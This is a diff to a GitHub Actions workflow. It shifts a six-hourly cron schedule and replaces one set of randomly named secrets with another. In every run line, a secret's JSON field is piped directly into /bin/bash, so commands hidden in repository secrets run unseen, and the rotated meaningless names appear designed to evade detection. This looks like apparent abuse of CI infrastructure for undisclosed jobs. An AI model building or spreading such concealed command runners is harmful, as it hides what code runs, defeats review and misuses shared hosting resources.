@@ -2,7 +2,7 @@ name: zhangshancui4657
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 2/6 * * *'
+    - cron: '50 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangshancui4657
         env:
-          dfspr7: ${{ secrets.dfspr7 }}
+          jo10: ${{ secrets.jo10 }}
         run: |
-          echo $dfspr7 | jq -r .xyajf12 | /bin/bash
-          echo $lh62 | jq -r .ixetb1215 | /bin/bash
-          echo $d3482 | jq -r .m30139 | /bin/bash
-          echo $wfay58408 | jq -r .r9070 | /bin/bash
-          echo $uvfw04359 | jq -r .swm1 | /bin/bash
-          echo $hgnj93 | jq -r .l038 | /bin/bash
-          echo $xtc4732 | jq -r .y04143 | /bin/bash
-          echo $tc28167 | jq -r .mtah681 | /bin/bash
-          echo $s37 | jq -r .stnr6 | /bin/bash
-          echo $we5232 | jq -r .yg76 | /bin/bash
-          echo $znfip3 | jq -r .oujfe52686 | /bin/bash
-          echo $p5 | jq -r .ofn6714 | /bin/bash
+          echo $jo10 | jq -r .a63 | /bin/bash
+          echo $cal873 | jq -r .wfkf13 | /bin/bash
+          echo $dbe46836 | jq -r .fu3276 | /bin/bash
+          echo $mrp3 | jq -r .esp98 | /bin/bash
+          echo $gk66 | jq -r .udgcu36427 | /bin/bash
+          echo $we06559 | jq -r .fx712 | /bin/bash
+          echo $gd4132 | jq -r .fl1 | /bin/bash
+          echo $ebxqs05039 | jq -r .baesi98 | /bin/bash
 
